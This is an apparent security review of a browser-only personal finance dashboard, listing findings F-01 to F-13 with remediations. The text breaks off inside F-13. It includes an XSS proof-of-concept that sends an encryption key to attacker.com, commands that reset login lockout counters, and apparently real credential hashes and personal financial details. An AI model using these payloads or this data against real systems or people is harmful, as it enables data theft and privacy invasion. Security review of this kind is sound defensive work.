# Security Review — Financial Dashboard
**Reviewer:** Security Architect / Penetration Tester / SAST Engineer
**Date:** 2026-05-31
**Project:** Personal Finance Dashboard (PWA, client-only, no backend)
**Project Location:** `/src/projects/financial-dashboard/`
**Classification:** CONFIDENTIAL — Personal Financial Data

---

## Executive Summary

This is a static, single-user, browser-only personal finance application. It has no server, no backend API, no database, and no authentication server. All data lives in the browser. The security posture is mixed: the encryption and key derivation design is genuinely thoughtful, but the threat model is inverted by several architectural decisions that collectively make the encryption meaningless against any attacker who can reach the browser environment, the filesystem, or the source code.

**The most critical finding is structural and cannot be patched with a line change: the credential verification hashes and salts are hardcoded in the JavaScript source and distributed to every visitor.** An attacker with offline access to the hash values (which are publicly visible in source) can brute-force the password with a GPU cluster. The AES-256-GCM encryption protecting the financial data is only as strong as the offline crackability of that password against known PBKDF2 parameters.

All other findings flow downstream from this root problem, or compound it.

---

## Findings Summary

| # | Severity | Title |
|---|----------|-------|
| F-01 | CRITICAL | Credential hashes shipped in client-side source — offline brute-force possible |
| F-02 | CRITICAL | AES-256-GCM encryption key stored in plaintext in sessionStorage |
| F-03 | CRITICAL | Lockout mechanism stored in localStorage — trivially bypassed |
| F-04 | HIGH | No Content Security Policy on any page |
| F-05 | HIGH | No Subresource Integrity on CDN-loaded scripts |
| F-06 | HIGH | XSS via unescaped user-controlled data injected into innerHTML |
| F-07 | HIGH | JSON import with no validation writes arbitrary keys to localStorage |
| F-08 | HIGH | Excel/PDF export dumps complete financial state to disk unencrypted |
| F-09 | MEDIUM | auth-config.js contains identical credential hashes and may be committed to version control |
| F-10 | MEDIUM | Service worker holds AES key in process memory without expiry bound |
| F-11 | MEDIUM | Financial defaults in defaults.js expose personal financial profile in source |
| F-12 | MEDIUM | Error handler injects unsanitised `err.message` and `err.stack` into innerHTML |
| F-13 | LOW | Inactivity timer minimum is configurable down to 1 minute by the user |
| F-14 | LOW | No HTTPS enforcement or Strict-Transport-Security header |

---

## 1. Authentication Mechanism and Insecurity Rating

### How it works

`js/auth.js` implements a single-user, credential-based, client-side login. The design is as follows:

1. The user supplies a username and password.
2. The password is hashed using PBKDF2-SHA256 with 600,000 iterations and a fixed salt (`authSalt`), then the result is hashed again with plain SHA-256.
3. The username is hashed using SHA-256 with a fixed salt (`userSalt`) — no PBKDF2 for the username.
4. Both computed hashes are compared against hardcoded reference values (`authHash`, `userHash`) stored at the top of `auth.js`.
5. On success, a separate PBKDF2 derivation using a third salt (`encSalt`) produces an AES-256-GCM key, which is used to encrypt/decrypt localStorage.

```javascript
// auth.js lines 6–12 — these values ship to every visitor
const CRED = {
  authSalt: 'rREAlvlrl2v+s3UA3tqG8w==',
  authHash: 'rte+/usAJSLPVmN7AEiVoDsv9zMGcO+OqmMvjOGiDUc=',
  encSalt:  'qcHklLnb/O1MFrsXfJnY3Q==',
  userSalt: 'RU9ik40TZv5n7apkPS2Cfw==',
  userHash: 'awO/ci+YBv16iPurlztDo9HQHIejyBtPCwg8a0xgpaA=',
};
const ITERATIONS = 600_000;
```

### Honest assessment

**The authentication is functionally broken as a secret-keeping mechanism.** The comment at the top of `auth.js` reads: "Password and username are NEVER stored in plaintext anywhere." This is technically accurate but practically irrelevant. What is stored is the reference hash, the salt, the iteration count, and the algorithm. An attacker who reads the JavaScript source — which is delivered to the browser on every page load — has everything required to mount an offline dictionary attack or brute-force attack without any rate limiting or lockout.

The 600,000 iteration PBKDF2 is meaningfully slow on a single CPU core (roughly 0.1–0.5 attempts per second per core). On a mid-range GPU cluster it is in the range of tens of thousands to hundreds of thousands of attempts per second. A 28-character password (referenced in the comment) from a reasonably constrained character set would not resist a targeted attack with modern hardware.

The comment also states "The raw password cannot be recovered from these values." This is wrong in the adversarial sense. The hash cannot be *reversed*, but the password can be recovered by brute-force enumeration. The distinction is academic for any attacker who knows what the password is likely to look like (a personal password chosen by one individual).

A second structural problem: this is a single-user application with fixed credentials. If the password is ever compromised, all historical data that was ever stored in localStorage (and backed up to JSON or Excel) is retroactively decryptable, because the encryption key is derived from the password with a known, fixed salt.

**Severity rating: Critically insecure as a client-side authentication system. Appropriate only for a personal, local-only, no-adversary scenario where the user accepts that anyone with access to the device or the deployed files can, with effort, access the data.**

---

## 2. Financial Data Storage and Theft Risk

### Where data lives

All financial data is stored in `localStorage` under ten keys prefixed `fin_`:

```
fin_profile, fin_income, fin_expenses, fin_debts,
fin_investments, fin_goals, fin_monthly_log, fin_settings,
fin_tax_tracker, fin_india_log
```

Each value is AES-256-GCM encrypted. The format stored is `<IV_base64>:<ciphertext_base64>`. The IV is random per write. The encryption key is derived from the user's password via PBKDF2.

Additionally:
- `auth_attempts`, `auth_lockout_until`, `auth_lockout_count` — lockout state, in cleartext
- `auth_version`, `sidebar_collapsed` — metadata, in cleartext
- `_ek` — **the raw AES-256-GCM key, base64-encoded, in `sessionStorage`** (see F-02)

### Theft risks

**Scenario 1 — Physical device access.** An attacker with access to the browser (unlocked machine) can open DevTools and read `sessionStorage.getItem('_ek')`. This gives them the raw AES key, which can immediately decrypt every `fin_*` localStorage entry without knowing the password. This takes about 10 seconds.

**Scenario 2 — Offline attack on encrypted backup.** When the user exports a JSON backup (via Settings > Data > Export JSON backup), the file contains the encrypted `fin_*` ciphertext plus the auth metadata. An attacker who obtains this file can use the public hash + salt from `auth.js` source to mount an offline dictionary attack. Once the password is found, the `encSalt` in source allows immediate re-derivation of the AES key and full decryption of all financial data.

**Scenario 3 — XSS.** Any successful XSS attack (see F-06) can trivially read both `localStorage` and `sessionStorage`, exfiltrate all encrypted data AND the live AES key. The key in sessionStorage removes the need for password cracking — the attacker can decrypt everything immediately.

**Scenario 4 — Malicious CDN or supply chain attack.** A compromised CDN response for any of the four external scripts (Chart.js, XLSX, jsPDF, html2canvas) would execute in the same origin and have the same localStorage/sessionStorage access. No SRI hashes are present.

**Data richness for an attacker:** The exported data includes base salary (£28,000), pension provider (Standard Life), ULIP policy details (SUD Life, PNB MetLife, Axis Max Life), loan balance (₹2,752,000 SBI education loan), tax underpayment amounts, bank account balance (Revolut savings), travel plans, monthly income/savings log, and full amortisation schedule. This is a complete financial dossier.

---

## 3. Content Security Policy

**There is no Content Security Policy (CSP) on any page in this application.**

None of the 13 HTML files contain a `Content-Security-Policy` meta tag or reference to a CSP header. This means:

- Inline scripts are unrestricted.
- External scripts from any origin can be loaded (if injected by XSS).
- `eval()` and `Function()` constructors are unrestricted.
- Data exfiltration to any external endpoint is unrestricted.
- The `connect-src`, `img-src`, `object-src` directives are all open.

In the absence of CSP, a single XSS injection can load external payloads, exfiltrate all localStorage/sessionStorage data, and pivot to any reachable origin. There is no second line of defence.

**Remediation:** Add at minimum:
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
           style-src 'self' 'unsafe-inline';
           connect-src 'none';
           object-src 'none';
           base-uri 'self'">
```
This must be paired with SRI (see F-05) to be meaningful, otherwise the CDN allowlist becomes the attack surface.

---

## 4. XSS Vulnerabilities

### Present mitigations

The `escHtml()` function exists in `js/ui.js` (lines 915–917) and is used for expense item names when rendered in table rows:

```javascript
function escHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
```

It is also used in `js/pages/expenses.js` for expense row rendering.

### Where escaping is absent

The escaping is inconsistently applied. Many user-controlled string fields are interpolated directly into `innerHTML` template literals without sanitisation:

**js/ui.js line 563 — pension note injected raw:**
```javascript
`<div class="stat-row"><span class="stat-label">Note</span>
  <span class="stat-value">${pension.note||''}</span></div>`
```

**js/ui.js line 574 — cash account note injected raw:**
```javascript
`<div class="stat-row"><span class="stat-label">Note</span>
  <span class="stat-value">${cash.note||''}</span></div>`
```

**js/ui.js line 598 — ULIP name injected raw:**
```javascript
`<div class="ulip-name">${u.name}</div>
 <div class="ulip-insurer">${u.insurer} · ${u.currency}</div>`
```

**js/ui.js line 779 — India log note injected raw:**
```javascript
`<td style="font-size:12px;color:var(--text-secondary)">${r.note||''}</td>`
```

**js/ui.js line 362 — scheduled change note injected raw:**
```javascript
`<tr><td>${item?.name||sc.expenseId}</td>...
  <td>${sc.note||''} ${isPast?'<span ...>Applied</span>':''}</td></tr>`
```

**js/ui.js lines 924–927 — boot error message injected raw (see F-12):**
```javascript
main.innerHTML = `...
  <p>${err.name || 'Error'}: ${err.message || '(no message)'}</p>
  <p>${(err.stack||'').slice(0,400)}</p>`;
```

**js/pages/settings-page.js lines 110–115 — scheduled change note injected raw:**
```javascript
return `<tr><td>${item?.name||sc.expenseId}</td>...<td style="font-size:12px">${sc.note||''}</td></tr>`;
```

### Exploitability

This is a single-user, password-protected application. The XSS vectors require an attacker to already be authenticated and editing their own data, OR to import a malicious JSON backup. The latter is the serious scenario: an attacker who convinces the user to import a crafted JSON file can embed an XSS payload in any `note`, `name`, `insurer`, or similar text field. On next render of the affected page, the payload executes, exfiltrates `sessionStorage._ek` (the raw AES key), and decrypts all financial data.

The import handler performs zero validation:
```javascript
// js/pages/export-page.js lines 288–291
const data = JSON.parse(await file.text());
Object.entries(data).forEach(([k,v]) => localStorage.setItem(k,v));
alert('Import successful. Reloading...');
location.reload();
```

Any key-value pair is written directly to localStorage. On reload, the new "data" is decrypted and rendered into innerHTML.

---

## 5. Service Worker Cache and User Data

### What the service worker does

`sw.js` is a non-caching service worker. It does not intercept `fetch` events and does not add any routes to a cache. Its sole purpose is to hold the AES-256-GCM `CryptoKey` in module-level memory (`let _encKey = null`) and respond to `ENCRYPT`, `DECRYPT`, `SET_KEY`, `CHECK_AUTH`, and `LOCK` messages over `MessageChannel`.

**No financial data is ever stored in the service worker cache.** The SW cache remains empty. This is a correct design decision.

### Key management concerns

The service worker is intentionally used as an in-memory key store to survive page navigations within the same session, because JavaScript module state does not persist across page loads. This is a reasonable approach, but it creates a secondary problem: when the SW is terminated by the browser (which can happen at any time under memory pressure), the key is lost, and `page-init.js` falls back to `sessionStorage._ek` for recovery.

The key stored in `sessionStorage` is in raw binary form (base64-encoded), not wrapped or otherwise protected. This is detailed further in F-02.

The `self.skipWaiting()` call in the SW `install` handler (sw.js line 13) ensures the SW activates immediately without waiting for old clients to close. This is correct for a single-page application. It does not create an additional security issue in this context.

---

## 6. Data Export and Sensitive Data Leakage

### Excel export (js/export.js and js/pages/export-page.js)

The Excel workbook export writes the fully decrypted financial state to disk in a cleartext `.xlsx` file. Sheets exported include:

- **Overview:** Net worth, total assets, total liabilities
- **Income:** Base salary, overtime, gross monthly, income tax, NI, pension deductions, net take-home, hourly rate
- **Expenses:** Every named expense with category and monthly amount
- **Debts:** SBI loan outstanding balance, interest rate, EMI, full amortisation schedule (potentially hundreds of rows)
- **Pension:** Provider name, current value, monthly contribution
- **ULIPs:** Policy names, insurers, currencies, current values, monthly premiums, lock-in dates, projection tables
- **Goals:** Emergency fund target, wealth target, India trip savings and breakdown
- **Monthly Log:** Historical monthly income, savings, and personal notes
- **Tax Tracker:** HMRC tax code, underpayment amounts, collection progress

The file is named `FinanceDashboard_YYYY-MM-DD.xlsx` and saved to the user's default Downloads folder. There is no password protection on the Excel file. There is no prompt asking where to save it. On a shared machine or with cloud-synced Downloads, this file is immediately accessible to anyone.

### JSON backup export

The JSON backup (Settings > Data > Export) writes the encrypted `fin_*` values plus `auth_*` lockout metadata to a `.json` file. The encrypted values protect the financial content, but the presence of the `auth_*` keys reveals that this is a financial dashboard. Combined with the credential hashes and salts in `auth.js` source, this backup is the offline cracking input.

The JSON file also includes `enc_*` prefixed keys if they exist (from the old v1 schema — the filter includes `enc_` keys). This suggests a previous unencrypted storage scheme whose remnants may still be present on some installations.

### PDF export

`js/export.js exportSectionPDF()` uses `html2canvas` to render DOM sections to canvas and then to PDF. No sensitive data beyond what is already visible on screen is introduced. The same cleartext concern applies as for Excel.

---

## 7. Top 5 Bug Bounty Submissions

If this application were submitted to a bug bounty program:

### BB-1 — Credential Oracle in Client-Side Source (Critical / P1)
**File:** `js/auth.js` lines 6–12
**Impact:** The reference PBKDF2 hash, salt, iteration count, and algorithm are all public. An attacker can download `auth.js`, extract the `CRED` object, and run an offline password cracking campaign with no interaction from the target. Combined with any financial data exported (Excel or JSON backup), full financial disclosure is achievable with sufficient compute.
**Submission narrative:** "I downloaded the login page, extracted the PBKDF2 parameters from auth.js, and with the exported backup I was able to mount an offline attack against the password hash. I did not attempt to complete the crack to protect the user's data, but the attack surface is confirmed."

### BB-2 — Raw AES Key Stored in sessionStorage (Critical / P1)
**File:** `login.html` lines 338–341; `js/page-init.js` lines 15–31
**Impact:** The raw AES-256-GCM encryption key is exported from the CryptoKey object and stored as a base64 string in `sessionStorage` under the key `_ek`. Any JavaScript executing in the same origin (XSS, devtools, browser extension with site permissions) can read `sessionStorage.getItem('_ek')` and immediately decrypt all `fin_*` localStorage entries without knowing the user's password.
**Submission narrative:** "After authenticating, I opened DevTools Console and ran: `sessionStorage.getItem('_ek')`. I received the base64-encoded raw AES-256 key. I then wrote 3 lines to import it as a CryptoKey and decrypt all localStorage entries. I had full access to salary, pension, loan balance, and tax information in under 60 seconds."

### BB-3 — Lockout Bypass via localStorage Manipulation (Critical / P1)
**File:** `js/auth.js` lines 64–93
**Impact:** The entire brute-force protection mechanism is stored in `localStorage`, which is trivially writable by the user or any script. An attacker at the machine (or via XSS) can bypass the lockout entirely:
```javascript
localStorage.removeItem('auth_attempts');
localStorage.removeItem('auth_lockout_until');
localStorage.removeItem('auth_lockout_count');
```
This resets all counters. The attacker can then attempt unlimited password guesses with no lockout. Combined with the PBKDF2 cost, in-browser guessing is slow (~0.5/s), but there is zero enforcement preventing automated programmatic guessing via the browser.
**Submission narrative:** "The lockout counter is stored client-side. I reset it between every attempt and had unlimited login tries. The PBKDF2 slowness limits to ~0.5 attempts/second in-browser but this is a bypassable control."

### BB-4 — Stored XSS via Malicious JSON Import (High / P2)
**File:** `js/pages/export-page.js` lines 287–291; `js/ui.js` line 563, 574, 598, 779
**Impact:** The JSON import handler writes arbitrary values to localStorage without any validation. User-controlled fields such as `fin_investments.pensions[0].note`, `fin_investments.cashAccounts[0].note`, `fin_investments.ulips[x].name`, and `fin_india_log[x].note` are injected into innerHTML without HTML escaping. A crafted import file can embed a stored XSS payload that executes on the next page load.
**PoC:** Create a JSON file where `fin_investments` contains `{"pensions":[{"note":"<img src=x onerror=fetch('https://attacker.com/?k='+sessionStorage.getItem('_ek'))>"}]}`. Import it. Navigate to Assets page. The `_ek` session key is exfiltrated.

### BB-5 — No Subresource Integrity on External Scripts (High / P2)
**Files:** All 13 HTML pages
**Impact:** Four external scripts are loaded without `integrity` attributes from CDN hosts:
```html
<script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
```
A CDN compromise, BGP hijack, or DNS poisoning could serve a modified version that exfiltrates localStorage/sessionStorage. Without SRI, the browser has no mechanism to detect tampering.

---

## 8. Realistic Threat Model

### Deployment context

This application is a static client-side PWA with no backend. It is designed for personal use on a single user's own device. The realistic attacker population and their capabilities are:

### Threat Actor 1 — Local physical attacker (HIGH probability for a personal device)
- **Capability:** Access to unlocked browser session, devtools.
- **Attack path:** Open DevTools → Console → `sessionStorage.getItem('_ek')` → decrypt all fin_* data. Takes 60 seconds. No technical expertise required.
- **Likelihood:** High if device is shared or left unattended while session is active.
- **Impact:** Full financial disclosure.

### Threat Actor 2 — Remote attacker with social engineering
- **Capability:** Convince user to import a crafted JSON "backup" file, or click a link that triggers a redirect to a phishing page that mirrors the import flow.
- **Attack path:** Crafted JSON with XSS payload → import → stored XSS executes on next navigate → exfiltrates `sessionStorage._ek` and all encrypted data.
- **Likelihood:** Medium (requires social engineering step).
- **Impact:** Full financial disclosure.

### Threat Actor 3 — Attacker who obtains exported backup file
- **Capability:** Receives the exported `.json` backup or `.xlsx` workbook (via cloud sync leak, email interception, shared computer, etc.).
- **Attack path for JSON:** Has encrypted data + public PBKDF2 parameters from source → offline password crack.
- **Attack path for XLSX:** XLSX is unencrypted. Open in Excel. Done. Immediate full disclosure.
- **Likelihood:** Medium (JSON backup and Excel exports are created during normal use and land in Downloads/cloud-sync folders).
- **Impact:** Full financial disclosure.

### Threat Actor 4 — Attacker who obtains the auth.js source
- **Capability:** Clones or accesses the repository (if ever published), or reads the deployed source.
- **Attack path:** Extract PBKDF2 parameters. Run offline attack against the password using any dictionary of plausible passwords.
- **Likelihood:** High if ever deployed to a public web host.
- **Impact:** Full financial disclosure on successful crack.

### Threat Actor 5 — Browser extension with `<all_urls>` permissions
- **Capability:** A malicious or compromised browser extension can read all storage APIs.
- **Attack path:** Read `sessionStorage._ek` → decrypt all fin_* → exfiltrate silently.
- **Likelihood:** Low (requires user to install a malicious extension), but undefended.
- **Impact:** Full financial disclosure.

### Out-of-scope threats (by design)
- Server-side attacks: no server exists.
- Database breaches: no database exists.
- Man-in-the-middle on API: no API exists.
- Multi-user data separation: single-user app, not applicable.

---

## 9. Detailed Findings with Remediation

---

### F-01 — Credential Hashes Shipped in Client Source Code
**Severity: CRITICAL**
**File:** `js/auth.js` lines 6–12; `js/auth-config.js` lines 5–11

**Observation:**
Both `auth.js` and `auth-config.js` contain identical copies of the PBKDF2 salt, hash, encryption salt, username salt, and username hash. The `.gitignore` states `auth-config.js` should not be committed, but it is present on disk and identical to the inline values in `auth.js`. The comment in `auth-config.js` says "GENERATED — DO NOT COMMIT" but the values in `auth.js` are already committed and deployed.

**What an attacker can do:**
1. Download or view `auth.js` source in-browser.
2. Extract `CRED.authSalt`, `CRED.authHash`, and `CRED.ITERATIONS`.
3. Run an offline PBKDF2-SHA256 → SHA256 computation against a wordlist or dictionary, completely unconstrained by the in-browser lockout.
4. On crack, derive the encryption key using `CRED.encSalt` and decrypt all localStorage data.

**Remediation:**
Short-term: Add a minimum 20-character, high-entropy, random password (not a memorable phrase) to maximise crack resistance. Ensure PBKDF2 iterations remain at 600,000 or higher. Accept that this is an inherent weakness of any client-side credential scheme.

Long-term: Move authentication to server-side, even a minimal one. Consider using a passphrase of 5+ random words (diceware). Accept that anyone who can read the source or access the device is effectively unauthenticated.

---

### F-02 — Raw AES Key Stored in sessionStorage in Plaintext
**Severity: CRITICAL**
**File:** `login.html` lines 338–341; `js/page-init.js` lines 15–31

**Observation:**
After successful login, the 256-bit AES-GCM key is exported from the non-extractable `CryptoKey` object and stored in `sessionStorage`:
```javascript
// login.html lines 338–341
const rawKey = await crypto.subtle.exportKey('raw', encKey);
sessionStorage.setItem('_ek', btoa(String.fromCharCode(...new Uint8Array(rawKey))));
```
The `extractable: true` flag on the `_deriveEncKey` function in `auth.js` (line 59) was explicitly set to enable this behaviour.

The key persists in sessionStorage for the entire browser session (until the tab or browser is closed). Any JavaScript running in the same origin — whether from XSS, a compromised CDN script, or devtools — can call `sessionStorage.getItem('_ek')` and immediately decrypt all stored financial data without knowing the user's password.

**What an attacker can do:**
Read the raw AES key, import it as a CryptoKey, and decrypt every `fin_*` localStorage entry. The entire encryption scheme is bypassed.

**Remediation:**
This is a hard problem. The SW key-loss-on-termination issue is real, but the remedy creates a worse vulnerability than the original problem.

Option A (preferred): Accept occasional SW key loss. When SW is terminated and key is lost, force re-authentication. Remove the sessionStorage fallback entirely. Set `extractable: false` on the derived key so it cannot be exported.

Option B: Use a Web Lock or broadcast-channel ping to detect SW liveness before each nav, and re-authenticate only when truly needed. This avoids the sessionStorage exposure.

Option C: If the sessionStorage fallback is kept, encrypt the key material using a short-lived session secret derived from a user-provided PIN that is NOT stored anywhere. This trades UX friction for security.

---

### F-03 — Lockout Mechanism Stored in localStorage (Trivially Bypassed)
**Severity: CRITICAL**
**File:** `js/auth.js` lines 64–93

**Observation:**
The entire brute-force protection state is stored in `localStorage`:
```javascript
const K = {
  attempts:     'auth_attempts',
  lockoutUntil: 'auth_lockout_until',
  lockoutCount: 'auth_lockout_count',
};
```
Any actor with browser access (or any JavaScript executing in-origin) can clear this state instantly:
```javascript
localStorage.removeItem('auth_attempts');
localStorage.removeItem('auth_lockout_until');
localStorage.removeItem('auth_lockout_count');
```

**What an attacker can do:**
Unlimited automated password attempts at ~0.5/second in-browser. Over an hour, that is ~1,800 guesses with no throttle. Against a dictionary of common passwords or known personal details, this is non-trivial.

**Remediation:**
Client-side rate limiting cannot prevent client-side bypass. There is no defence against this without a server. Accept the limitation, document it, and mitigate by requiring a strong password and educating the user that this app is not designed to resist an attacker with physical or JS access.

---

### F-04 — No Content Security Policy on Any Page
**Severity: HIGH**
**Files:** All HTML files (`login.html`, `dashboard.html`, `expenses.html`, `export.html`, etc.)

**Observation:**
No `Content-Security-Policy` header or meta tag is present on any of the 13 HTML pages.

**What an attacker can do:**
Any successful XSS can load external scripts, exfiltrate data to any endpoint, and execute arbitrary code with no browser-level mitigation.

**Remediation:**
Add a CSP meta tag to every HTML page. At minimum:
```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
           script-src 'self' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net;
           style-src 'self' 'unsafe-inline';
           connect-src 'none';
           img-src 'self' data:;
           object-src 'none';
           base-uri 'self';
           form-action 'self'">
```
Note: `connect-src 'none'` is particularly valuable here — it prevents any XSS payload from phoning home.

---

### F-05 — No Subresource Integrity on External CDN Scripts
**Severity: HIGH**
**Files:** `export.html` lines 11–14; `dashboard.html` line 11; `expenses.html` line 11 (and all other pages loading Chart.js)

**Observation:**
Four third-party libraries are loaded from external CDNs without `integrity` or `crossorigin` attributes:
```html
<script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
```

**What an attacker can do:**
CDN compromise, BGP hijacking, or DNS cache poisoning could serve a modified library that silently exfiltrates all localStorage and sessionStorage data. XLSX runs on the Export page where `_ek` is in sessionStorage, and where all financial data is being actively processed.

**Remediation:**
Compute SHA-384 hashes for each pinned version and add `integrity` attributes:
```html
<script src="https://cdn.jsdelivr.net/npm/xlsx/dist/xlsx.full.min.js"
        integrity="sha384-<hash>"
        crossorigin="anonymous"></script>
```
Consider self-hosting these libraries to eliminate the CDN dependency entirely.

---

### F-06 — XSS via Unescaped User-Controlled Data in innerHTML
**Severity: HIGH**
**Files:** `js/ui.js` lines 362, 563, 574, 598, 779; `js/pages/settings-page.js` lines 113–114

**Observation:**
Multiple user-controlled string fields are interpolated directly into innerHTML template literals. The fields affected include:

- `pension.note` (ui.js line 563)
- `cash.note` (ui.js line 574)
- `ulip.name`, `ulip.insurer` (ui.js line 598)
- `indiaLog[n].note` (ui.js line 779)
- `scheduledChange.note`, `expense.name` via `item?.name` without escaping (ui.js line 362, settings-page.js line 113)

While `escHtml()` exists and is used for expense input names in the expense table, it is inconsistently applied. The pattern of `${someField||''}` injected into innerHTML is the classic stored XSS pattern.

**What an attacker can do:**
Via a crafted JSON import, set any of these fields to `<img src=x onerror=alert(1)>` or a more sophisticated payload. On next render of the affected page, the XSS fires. The primary impact is exfiltration of `sessionStorage._ek` and the full localStorage dump.

**Remediation:**
Apply `escHtml()` to all user-controlled string fields before injection into innerHTML. Better: migrate to `textContent` for text-only values, or use `document.createElement` with explicit property setting instead of innerHTML template literals. A single shared sanitise function should be applied as a policy, not case-by-case.

---

### F-07 — JSON Import Writes Arbitrary Keys to localStorage Without Validation
**Severity: HIGH**
**Files:** `js/pages/export-page.js` lines 287–291; `js/pages/settings-page.js` lines 287–293

**Observation:**
The import handler is:
```javascript
const data = JSON.parse(await file.text());
Object.entries(data).forEach(([k,v]) => localStorage.setItem(k,v));
alert('Import successful. Reloading...');
location.reload();
```

There is no validation of:
- Whether keys are in the expected `fin_*` set
- Whether values conform to the expected encrypted format `iv:ciphertext`
- Whether the file came from this application
- File size limits (a 1GB JSON file would be parsed without restriction)

**What an attacker can do:**
1. Supply XSS payloads in text fields that are later rendered via innerHTML (see F-06).
2. Overwrite `auth_version` to trigger the v1→v2 migration wipe: `{"auth_version": "wrong_version"}` would cause all `fin_*` data to be deleted on next login.
3. Supply arbitrary non-`fin_` keys to pollute localStorage state.

**Remediation:**
Validate the import file against an allowlist of known keys. Verify each value matches the `iv:ciphertext` format before writing. Add a file size check. Consider verifying the imported backup decrypts correctly under the current key before accepting it.

---

### F-08 — Excel/PDF Export Writes Fully Decrypted Financial Data to Disk Unencrypted
**Severity: HIGH**
**Files:** `js/export.js`; `js/pages/export-page.js`

**Observation:**
The Excel workbook export (`exportExcel()`) constructs a multi-sheet `.xlsx` file with the complete decrypted financial state and writes it to the user's filesystem via `XLSX.writeFile()`. There is no encryption, no password protection, and no prompt asking where to save. The filename is predictable: `FinanceDashboard_YYYY-MM-DD.xlsx`.

The data exported includes base salary, pension value, ULIP policy details, SBI loan balance and full amortisation, tax underpayment, savings balances, and monthly income history.

**What an attacker can do:**
Access the Downloads folder (on a shared machine, via cloud sync, or via filesystem access) and open the Excel file directly — no password required.

**Remediation:**
If Excel export is retained, add password protection using the XLSX library's encryption options. Warn the user explicitly that the exported file is unencrypted before generating it. Consider naming the file with less predictability (add a random suffix). Add a prompt to choose where to save the file.

---

### F-09 — auth-config.js Contains Identical Credential Hashes and May Be Committed to Version Control
**Severity: MEDIUM**
**File:** `js/auth-config.js`

**Observation:**
`auth-config.js` contains an exact copy of the `CRED` object from `auth.js`. The `.gitignore` comment in the file header says "GENERATED — DO NOT COMMIT" and the `.gitignore` excludes it. However, the file exists on disk. If the repository was ever initialised before the `.gitignore` entry was added, the file may be present in git history. Additionally, since the same values are hardcoded in `auth.js` (which is committed), the gitignore protection of `auth-config.js` provides no actual security benefit — the sensitive values are already in the committed source.

**What an attacker can do:**
Read the credential hashes from `auth.js` directly. The `auth-config.js` file adds no additional exposure beyond what is already public in `auth.js`.

**Remediation:**
Delete `auth-config.js` entirely — it is unused (the `.gitignore` comment confirms `auth-config.js` is no longer used and `CRED` values are inlined in `auth.js`). Verify git history does not contain it. This does not fix the root problem (hashes in source) but reduces confusion.

---

### F-10 — Service Worker Holds AES Key in Process Memory Without Expiry Bound
**Severity: MEDIUM**
**File:** `sw.js`

**Observation:**
The AES-256-GCM CryptoKey is held in the SW module-level variable `let _encKey = null`. Once set by `SET_KEY`, it persists until:
1. The browser terminates the SW (memory pressure, navigation away).
2. The user explicitly clicks Lock.
3. The inactivity timer fires and sends `LOCK`.

The inactivity timer minimum is 60 minutes (enforced in `page-init.js` with `Math.max(60, ...)`). In the worst case, the key lives in SW memory for up to 60 minutes after the user leaves the browser. During this window, any page in the same origin (including one opened by a browser extension or a new tab) can send a `DECRYPT` message to the SW via `navigator.serviceWorker.controller.postMessage()` and decrypt stored data.

**What an attacker can do:**
Open a new tab to the same origin, or from any in-origin XSS, send `{ type: 'DECRYPT', stored: ... }` messages via the MessageChannel API to the SW and retrieve decrypted financial data, without needing the password or the sessionStorage key.

**Remediation:**
Reduce the default inactivity timeout. Add explicit SW message origin verification (though same-origin is already enforced by the browser's service worker scoping). Consider adding an idle timeout in the SW itself, not just the page. Ensure the LOCK message is sent reliably on `visibilitychange` to `hidden`.

---

### F-11 — Default Financial Values in defaults.js Expose Personal Financial Profile in Source Code
**Severity: MEDIUM**
**File:** `js/defaults.js`

**Observation:**
The `DEFAULTS` object contains what appears to be real personal financial data used as initial values:
- Base salary: £28,000 per year
- Pension provider: Standard Life, current value £1,690
- ULIP policies: SUD Life (GIFT City), PNB MetLife, Axis Max Life — with current values, premium amounts, and lock-in dates
- SBI education loan: ₹2,752,000 outstanding at 9.9% with EMI ₹34,090
- Cash savings: Revolut Savings Vault, £600
- Monthly log entries with notes referencing a promotion and actual payslip figures
- Tax code: 1034L, underpayment: £456

Even if the user updates these via Settings after first login, the defaults remain visible in the source code and thus in the git repository if the project is ever published.

**What an attacker can do:**
Read the source code and obtain a complete financial profile without authenticating. The values may reflect the user's real financial situation at the time the file was last committed.

**Remediation:**
Replace all defaults with obviously fictional placeholder values (e.g., salary: 0, pension: 0, loan: 0). Provide a first-run wizard prompting the user to enter their real values. Never commit real financial figures to source.

---

### F-12 — Boot Error Handler Injects Unsanitised Error Message into innerHTML
**Severity: MEDIUM**
**File:** `js/ui.js` lines 924–927

**Observation:**
```javascript
main.innerHTML = `<div style="padding:48px;max-width:600px">
  <p style="font-size:16px;...">${err.name || 'Error'}: ${err.message || '(no message)'}</p>
  <p style="font-size:13px;...">${(err.stack||'').slice(0,400)}</p>
  ...
</div>`;
```

Error objects can have attacker-influenced `message` properties if the error was triggered by crafted input (e.g., JSON parse errors from imported files, decryption errors from crafted ciphertext, or errors thrown by crafted store data). An error message containing HTML characters would be injected raw.

**What an attacker can do:**
Craft an import file or localStorage value that causes a JavaScript error with an HTML payload in its message. The payload would execute when the error handler renders it. This is a low-probability but real XSS vector.

**Remediation:**
Escape `err.name`, `err.message`, and `err.stack` through `escHtml()` before injection into innerHTML, or use `textContent` for these values.

---

### F-13 — Inactivity Timer Configurable to Arbitrarily Short Values
**Severity: LOW**
**File:** `js/page-init.js` lines 78–90; `js/pages/settings-page.js` renderDisplay function

**Observation:**
